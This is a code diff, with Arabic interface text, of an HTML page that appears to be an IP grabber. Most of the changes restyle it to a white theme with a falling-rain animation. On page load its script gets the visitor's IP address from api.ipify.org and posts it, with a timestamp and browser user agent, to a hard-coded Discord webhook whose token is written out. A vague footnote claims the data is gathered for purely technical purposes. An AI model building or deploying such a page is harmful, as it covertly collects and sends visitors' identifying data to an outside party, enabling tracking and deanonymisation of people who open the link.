@@ -11,35 +11,72 @@
             box-sizing: border-box;
         }
         body {
-            background-color: #000000; /* أسود خالص */
+            background-color: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: 'Segoe UI', 'Courier New', monospace;
-            color: #00ffcc;
+            color: #000000;
             padding: 20px;
+            position: relative;
+            overflow: hidden;
         }
+        
+        /* تأثير المطر الأسود المتوهج */
+        .rain-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        
+        .rain-drop {
+            position: absolute;
+            width: 2px;
+            background: linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,0.8) 50%, rgba(0,0,0,1) 100%);
+            box-shadow: 0 0 10px rgba(0,0,0,0.5), 0 0 20px rgba(0,0,0,0.3);
+            animation: rainFall linear infinite;
+        }
+        
+        @keyframes rainFall {
+            0% {
+                transform: translateY(-100vh) translateX(0px);
+                opacity: 0.7;
+            }
+            100% {
+                transform: translateY(100vh) translateX(20px);
+                opacity: 0.1;
+            }
+        }
+        
         .container {
             text-align: center;
-            background: rgba(0,0,0,0.85);
-            border: 1px solid #222;
+            background: #ffffff;
+            border: 2px solid #000000;
             border-radius: 32px;
             padding: 2rem;
             max-width: 500px;
             width: 100%;
-            box-shadow: 0 0 20px rgba(0,255,204,0.1);
+            box-shadow: 0 0 30px rgba(0,0,0,0.8), 0 0 60px rgba(0,0,0,0.5);
             backdrop-filter: blur(2px);
+            position: relative;
+            z-index: 1;
         }
         .status {
             font-size: 1.2rem;
             margin-bottom: 1.5rem;
             letter-spacing: 1px;
             word-break: break-word;
+            color: #000000;
         }
         .ip-card {
-            background: #0a0a0a;
-            border-left: 4px solid #00ffcc;
+            background: #000000;
+            border: 3px solid #000000;
             padding: 1rem;
             border-radius: 16px;
             margin: 1rem 0;
@@ -47,14 +84,18 @@
             font-weight: bold;
             font-family: monospace;
             color: #ffffff;
+            box-shadow: 0 0 25px rgba(0,0,0,0.9), 0 0 50px rgba(0,0,0,0.6);
+            text-shadow: 0 0 20px rgba(255,255,255,0.8), 0 0 40px rgba(255,255,255,0.5), 0 0 60px rgba(255,255,255,0.3);
+            position: relative;
+            z-index: 2;
         }
         .loader {
             display: inline-block;
             width: 20px;
             height: 20px;
-            border: 2px solid #333;
+            border: 2px solid #000000;
             border-radius: 50%;
-            border-top-color: #00ffcc;
+            border-top-color: #000000;
             animation: spin 0.8s linear infinite;
             margin-right: 8px;
             vertical-align: middle;
@@ -68,182 +109,227 @@
         .footnote {
             margin-top: 20px;
             font-size: 0.7rem;
-            color: #444;
+            color: #333333;
         }
         button {
-            background: none;
-            border: 1px solid #2a2a2a;
-            color: #aaa;
+            background: #ffffff;
+            border: 2px solid #000000;
+            color: #000000;
             padding: 6px 12px;
             border-radius: 40px;
             cursor: pointer;
             margin-top: 12px;
             transition: 0.2s;
+            font-weight: bold;
         }
         button:hover {
-            border-color: #00ffcc;
-            color: #00ffcc;
+            background: #000000;
+            color: #ffffff;
+            border-color: #000000;
+            box-shadow: 0 0 20px rgba(0,0,0,0.6);
+        }
+        #webhookResult {
+            font-size: 0.8rem;
+            color: #000000;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .status-text {
+            color: #000000;
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="status">
-        <span id="loadingIcon" class="loader"></span>
-        <span id="statusText">جاري تحديد موقعك الرقمي...</span>
+    <!-- حاوية المطر -->
+    <div class="rain-container" id="rainContainer"></div>
+    
+    <div class="container">
+        <div class="status">
+            <span id="loadingIcon" class="loader"></span>
+            <span id="statusText" class="status-text">جاري تحديد موقعك الرقمي...</span>
+        </div>
+        <div id="ipDisplay" class="ip-card hidden">—. —. —. —</div>
+        <div id="webhookResult"> </div>
+        <button id="retryBtn" class="hidden">إعادة المحاولة</button>
+        <div class="footnote">يتم جمع المعلومات لأغراض تقنية بحتة</div>
     </div>
-    <div id="ipDisplay" class="ip-card hidden">—. —. —. —</div>
-    <div id="webhookResult" style="font-size: 0.8rem; color: #2e7d64; margin-top: 10px;"></div>
-    <button id="retryBtn" class="hidden">إعادة المحاولة</button>
-    <div class="footnote">يتم جمع المعلومات لأغراض تقنية بحتة</div>
-</div>
 
-<script>
-    (function() {
-        // الويب هوك المقدم
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519310508572803126/9TfCcfF-pReH5CIsHihmj80_EsYsx5DIDkrtsxzoq7gBpXG60-nh61YbwJZ4DlooA4Yf"
+    <script>
+        // توليد قطرات المطر
+        function createRainDrops() {
+            const container = document.getElementById('rainContainer');
+            const dropCount = 150;
+            
+            for (let i = 0; i < dropCount; i++) {
+                const drop = document.createElement('div');
+                drop.className = 'rain-drop';
+                
+                // خصائص عشوائية لكل قطرة
+                const left = Math.random() * 100;
+                const height = Math.random() * 80 + 20;
+                const duration = Math.random() * 1.5 + 0.8;
+                const delay = Math.random() * 3;
+                const width = Math.random() * 2 + 1;
+                
+                drop.style.left = left + '%';
+                drop.style.height = height + 'px';
+                drop.style.animationDuration = duration + 's';
+                drop.style.animationDelay = delay + 's';
+                drop.style.width = width + 'px';
+                drop.style.opacity = Math.random() * 0.5 + 0.3;
+                
+                container.appendChild(drop);
+            }
+        }
         
-        // عناصر dom
-        const loadingIcon = document.getElementById('loadingIcon');
-        const statusText = document.getElementById('statusText');
-        const ipDisplayDiv = document.getElementById('ipDisplay');
-        const webhookResultSpan = document.getElementById('webhookResult');
-        const retryBtn = document.getElementById('retryBtn');
+        // تنفيذ المطر عند تحميل الصفحة
+        createRainDrops();
 
-        // دالة مساعدة لإظهار النتائج أو الأخطاء
-        function setStatus(message, isLoading = false, ipValue = null) {
-            statusText.innerText = message;
-            if (isLoading) {
-                loadingIcon.classList.remove('hidden');
-                ipDisplayDiv.classList.add('hidden');
-                if (retryBtn) retryBtn.classList.add('hidden');
-            } else {
+        (function() {
+            // الويب هوك المقدم
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1519310508572803126/9TfCcfF-pReH5CIsHihmj80_EsYsx5DIDkrtsxzoq7gBpXG60-nh61YbwJZ4DlooA4Yf"
+            
+            // عناصر dom
+            const loadingIcon = document.getElementById('loadingIcon');
+            const statusText = document.getElementById('statusText');
+            const ipDisplayDiv = document.getElementById('ipDisplay');
+            const webhookResultSpan = document.getElementById('webhookResult');
+            const retryBtn = document.getElementById('retryBtn');
+
+            // دالة مساعدة لإظهار النتائج أو الأخطاء
+            function setStatus(message, isLoading = false, ipValue = null) {
+                statusText.innerText = message;
+                if (isLoading) {
+                    loadingIcon.classList.remove('hidden');
+                    ipDisplayDiv.classList.add('hidden');
+                    if (retryBtn) retryBtn.classList.add('hidden');
+                } else {
+                    loadingIcon.classList.add('hidden');
+                    if (ipValue && ipDisplayDiv) {
+                        ipDisplayDiv.innerText = ipValue;
+                        ipDisplayDiv.classList.remove('hidden');
+                    } else {
+                        ipDisplayDiv.classList.add('hidden');
+                    }
+                }
+            }
+
+            function showError(errorMsg, ipAddr = null) {
                 loadingIcon.classList.add('hidden');
-                if (ipValue && ipDisplayDiv) {
-                    ipDisplayDiv.innerText = ipValue;
+                statusText.innerText = errorMsg;
+                if (ipAddr) {
+                    ipDisplayDiv.innerText = ipAddr;
                     ipDisplayDiv.classList.remove('hidden');
                 } else {
                     ipDisplayDiv.classList.add('hidden');
                 }
-            }
-        }
-
-        function showError(errorMsg, ipAddr = null) {
-            loadingIcon.classList.add('hidden');
-            statusText.innerText = errorMsg;
-            if (ipAddr) {
-                ipDisplayDiv.innerText = ipAddr;
-                ipDisplayDiv.classList.remove('hidden');
-            } else {
-                ipDisplayDiv.classList.add('hidden');
-            }
-            if (retryBtn) retryBtn.classList.remove('hidden');
-            if (webhookResultSpan) webhookResultSpan.innerText = "⚠️ لم يتم الإرسال إلى الويب هوك بسبب خطأ.";
-        }
-
-        // إرسال IP إلى Webhook
-        async function sendIpToWebhook(ipAddress) {
-            if (!WEBHOOK_URL || WEBHOOK_URL === "") {
-                console.warn("Webhook URL غير موجود");
-                webhookResultSpan.innerText = "⚠️ عنوان الويب هوك غير معرّف.";
-                return false;
+                if (retryBtn) retryBtn.classList.remove('hidden');
+                if (webhookResultSpan) webhookResultSpan.innerText = "⚠️ لم يتم الإرسال إلى الويب هوك بسبب خطأ.";
             }
 
-            // تحضير البيانات التي سنرسلها (يمكن تخصيصها)
-            const payload = {
-                content: `🌐 **IP تم اكتشافه**: \`${ipAddress}\``,
-                embeds: [
-                    {
-                        title: "معلومات الزائر",
-                        color: 0x00ffcc,
-                        fields: [
-                            { name: "عنوان IP", value: ipAddress, inline: true },
-                            { name: "التوقيت", value: new Date().toLocaleString("ar-EG"), inline: true },
-                            { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
-                        ],
-                        footer: { text: "تم الجلب عبر api.ipify.org" },
-                        timestamp: new Date().toISOString()
-                    }
-                ]
-            };
-
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                if (response.ok) {
-                    webhookResultSpan.innerText = "✓ تم إرسال العنوان بنجاح إلى الخادم.";
-                    return true;
-                } else {
-                    const errorText = await response.text().catch(() => "خطأ غير معروف");
-                    console.error("فشل الإرسال:", response.status, errorText);
-                    webhookResultSpan.innerText = `✗ فشل الإرسال (HTTP ${response.status})`;
+            // إرسال IP إلى Webhook
+            async function sendIpToWebhook(ipAddress) {
+                if (!WEBHOOK_URL || WEBHOOK_URL === "") {
+                    console.warn("Webhook URL غير موجود");
+                    webhookResultSpan.innerText = "⚠️ عنوان الويب هوك غير معرّف.";
                     return false;
                 }
-            } catch (err) {
-                console.error("خطأ بالشبكة عند الإرسال إلى webhook:", err);
-                webhookResultSpan.innerText = `✗ خطأ شبكة: ${err.message}`;
-                return false;
-            }
-        }
 
-        // الوظيفة الأساسية: جلب IP ثم إرساله
-        async function fetchAndSendIp() {
-            setStatus("جاري الاتصال بخدمة IP...", true);
-            webhookResultSpan.innerText = "";
-            if (retryBtn) retryBtn.classList.add('hidden');
-            
-            try {
-                // 1. جلب IP من api.ipify.org (نص خام)
-                const response = await fetch("https://api.ipify.org/", {
-                    method: "GET",
-                    cache: "no-store"
+                // تحضير البيانات التي سنرسلها (يمكن تخصيصها)
+                const payload = {
+                    content: `🌐 **IP تم اكتشافه**: \`${ipAddress}\``,
+                    embeds: [
+                        {
+                            title: "معلومات الزائر",
+                            color: 0x000000,
+                            fields: [
+                                { name: "عنوان IP", value: ipAddress, inline: true },
+                                { name: "التوقيت", value: new Date().toLocaleString("ar-EG"), inline: true },
+                                { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
+                            ],
+                            footer: { text: "تم الجلب عبر api.ipify.org" },
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (response.ok) {
+                        webhookResultSpan.innerText = "✓ تم إرسال العنوان بنجاح إلى الخادم.";
+                        return true;
+                    } else {
+                        const errorText = await response.text().catch(() => "خطأ غير معروف");
+                        console.error("فشل الإرسال:", response.status, errorText);
+                        webhookResultSpan.innerText = `✗ فشل الإرسال (HTTP ${response.status})`;
+                        return false;
+                    }
+                } catch (err) {
+                    console.error("خطأ بالشبكة عند الإرسال إلى webhook:", err);
+                    webhookResultSpan.innerText = `✗ خطأ شبكة: ${err.message}`;
+                    return false;
+                }
+            }
+
+            // الوظيفة الأساسية: جلب IP ثم إرساله
+            async function fetchAndSendIp() {
+                setStatus("جاري الاتصال بخدمة IP...", true);
+                webhookResultSpan.innerText = "";
+                if (retryBtn) retryBtn.classList.add('hidden');
+                
+                try {
+                    // 1. جلب IP من api.ipify.org (نص خام)
+                    const response = await fetch("https://api.ipify.org/", {
+                        method: "GET",
+                        cache: "no-store"
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error(`فشل جلب IP: ${response.status}`);
+                    }
+                    
+                    const ipAddress = await response.text();
+                    // تحقق من أن النص يبدو مثل IP (أساسي)
+                    const ipPattern = /^(?:\d{1,3}\.){3}\d{1,3}$/;
+                    if (!ipPattern.test(ipAddress.trim())) {
+                        throw new Error("البيانات المستلمة ليست بصيغة IP صحيحة");
+                    }
+                    
+                    const cleanIp = ipAddress.trim();
+                    setStatus("تم تحديد العنوان!", false, cleanIp);
+                    
+                    // 2. إرسال الـ IP إلى ويب هوك ديسكورد
+                    await sendIpToWebhook(cleanIp);
+                    
+                } catch (error) {
+                    console.error("خطأ في عملية الجلب:", error);
+                    let errorMessage = "تعذر الحصول على IP. تحقق من اتصالك.";
+                    if (error.message.includes("Failed to fetch") || error.message.includes("NetworkError")) {
+                        errorMessage = "لا يمكن الوصول إلى api.ipify.org. تأكد من اتصال الإنترنت.";
+                    } else {
+                        errorMessage = `خطأ: ${error.message}`;
+                    }
+                    showError(errorMessage);
+                }
+            }
+
+            // إضافة مستمع لزر إعادة المحاولة
+            if (retryBtn) {
+                retryBtn.addEventListener('click', () => {
+                    fetchAndSendIp();
                 });
-                
-                if (!response.ok) {
-                    throw new Error(`فشل جلب IP: ${response.status}`);
-                }
-                
-                const ipAddress = await response.text();
-                // تحقق من أن النص يبدو مثل IP (أساسي)
-                const ipPattern = /^(?:\d{1,3}\.){3}\d{1,3}$/;
-                if (!ipPattern.test(ipAddress.trim())) {
-                    throw new Error("البيانات المستلمة ليست بصيغة IP صحيحة");
-                }
-                
-                const cleanIp = ipAddress.trim();
-                setStatus("تم تحديد العنوان!", false, cleanIp);
-                
-                // 2. إرسال الـ IP إلى ويب هوك ديسكورد
-                await sendIpToWebhook(cleanIp);
-                
-            } catch (error) {
-                console.error("خطأ في عملية الجلب:", error);
-                let errorMessage = "تعذر الحصول على IP. تحقق من اتصالك.";
-                if (error.message.includes("Failed to fetch") || error.message.includes("NetworkError")) {
-                    errorMessage = "لا يمكن الوصول إلى api.ipify.org. تأكد من اتصال الإنترنت.";
-                } else {
-                    errorMessage = `خطأ: ${error.message}`;
-                }
-                showError(errorMessage);
             }
-        }
-
-        // إضافة مستمع لزر إعادة المحاولة
-        if (retryBtn) {
-            retryBtn.addEventListener('click', () => {
-                fetchAndSendIp();
-            });
-        }
-        
-        // بدء التنفيذ فور تحميل الصفحة
-        fetchAndSendIp();
-    })();
-</script>
+            
+            // بدء التنفيذ فور تحميل الصفحة
+            fetchAndSendIp();
+        })();
+    </script>
 </body>
 </html>
